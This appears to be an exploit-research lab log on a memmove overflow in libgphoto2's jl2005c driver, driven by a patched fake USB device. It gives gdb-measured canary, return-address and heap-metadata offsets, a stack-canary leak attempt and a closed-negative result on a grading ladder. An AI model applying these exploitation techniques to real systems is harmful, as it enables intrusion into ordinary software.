# W166 (2026-11-23): canary-safe partial-reply / heap-metadata lane, closed negative
#
# All runs: real libgphoto2 2.5.34 source, plain (no ASan) build in
# src/libgphoto2-2.5.34-plain (CFLAGS '-O0 -g -fPIC -fno-omit-frame-pointer'),
# lab-patched vusb device, driver live/real_init_plain. Env for every run:
#   P=$PWD/lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34-plain/installdir-plain
#   CAMLIBS=$P/lib/libgphoto2/2.5.34
#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
#   LD_LIBRARY_PATH=$P/lib
#   M2SHELL_JL2005_VUSB=<mode> M2SHELL_JL2005_COUNT=<count>
#   port usb:001,001
#
# The committed patch live/vusb-jl2005.patch and all pins are UNCHANGED. A
# local-only mode 'p' was added to the untracked plain build tree's
# libgphoto2_port/vusb/vusb.c (then `make -C libgphoto2_port -j4` and copy
# libgphoto2_port/.libs/vusb.so over installdir-plain/lib/libgphoto2_port/
# 0.12.2/vusb.so) to make the device reply shorter than the requested 0x4000:
#
#   int n = size;
#   if (m2[0] == 's' && n > 0x3E20) n = 0x3E20;
#   if (m2[0] == 'p') {
#           const char *ls = getenv("M2SHELL_JL2005_LEN");
#           int lim = ls ? (int)strtol(ls, NULL, 0) : 0x3E38;
#           if (n > lim) n = lim;
#   }
#   memset(bytes, 0x5a, (size_t)n);
#   return n;
#
# A short bulk reply is a normal USB behaviour; the vulnerable code ignores
# gp_port_read()'s return value. The memmove length at :154 still comes from
# the device-reported count, so a short reply separates the stack write from
# the heap source over-read.

=== measured frame geometry (count 1022, breakpoint jl2005c.c:155) ===
Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
155             memmove(priv->table, info + 0x30, alloc_table_size - 0x30);
INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440

info starts at rbp-16440. Buffer info[0x4020] ends at info+16416. The
canary sits at info+16424 (0x4028), the saved RIP at info+16440 (0x4038).
The memmove source byte that lands on the following heap chunk's size field
is info+0x30+0x4000 = info+0x4030: eight bytes PAST the canary and eight
bytes BEFORE the saved RIP. Ordering is structural in this frame:
    info+0x4020  buffer end
    info+0x4028  stack canary
    info+0x4030  source of heap top-chunk size
    info+0x4038  saved RIP

=== full reply (mode 1): device controls top size but loses the canary ===
Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440
0x555555567630: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
0x555555567640: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
*** stack smashing detected ***: terminated
rc=134

=== canary-safe partial reply (mode p, LEN=0x3E28): canary survives, top does not ===
model_index=0
port_index=0 path=usb:001,001
gp_camera_init rc=0
rc=0

Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440
0x555555567620: 0x5a5a5a5a5a5a5a5a  0x544ee006d665bd00
0x555555567630: 0x00007fffffffca50  0x00007ffff7bf4a80

Separate run, count 1024, same LEN=0x3E28, gdb expression check:
CANARY=c4a763d9bc511700 HEAP=c4a763d9bc511700 TOP=00007fffffffca70

The source over-read copies the live stack canary verbatim into
priv->table+0x3FF8 (byte offset 16376) on every overflowing count. A second
run showed a different, still low-byte-zero canary there
(0x22c3906d8aeac900). But the same memmove writes leftover stack bytes over
the top chunk's size field (0x00007fffffffca50 / ...ca70). table is followed
by the top chunk in this build: immediately before the memmove,
table+0x4000 held the original top size 0x129d1. There is no live neighbour
object to hit.

=== consumer-visible leak attempt (negative) ===
Local-only driver live/canary_leak_probe.c calls the real APIs
gp_camera_folder_list_files() and gp_camera_file_get(cam, "/",
"jl_1023.ppm", GP_FILE_TYPE_NORMAL, ...). With count 1024 and the canary-safe
partial reply (nb_entries=1024 still rounds to 0x4200, so file jl_1023.ppm
is listed and its 16-byte table entry at table+0x3FF0 contains the canary):

malloc(): corrupted top size
rc=134

get_file_func's malloc(b + HEADERSIZE) (library.c:208, real source) aborts on
the corrupted top chunk before any file bytes are returned. The heap copy of
the canary is therefore not consumer-visible on this path.

=== disposition ===
A device-only partial reply cannot preserve the canary and still control
either the saved RIP or the heap top-chunk size: both source offsets lie at
or past the canary. Leaking the canary into the heap is real but the same
overflow destroys the allocator metadata, and the first real consumer
allocation aborts before the leak can be returned. Grade unchanged: rung 3
at the real heap destination, rung 4 chosen bytes at a control-flow slot
blocked by the protector, rung 5 UNKNOWN. No pin, committed patch, harness
or witness verdict was changed.
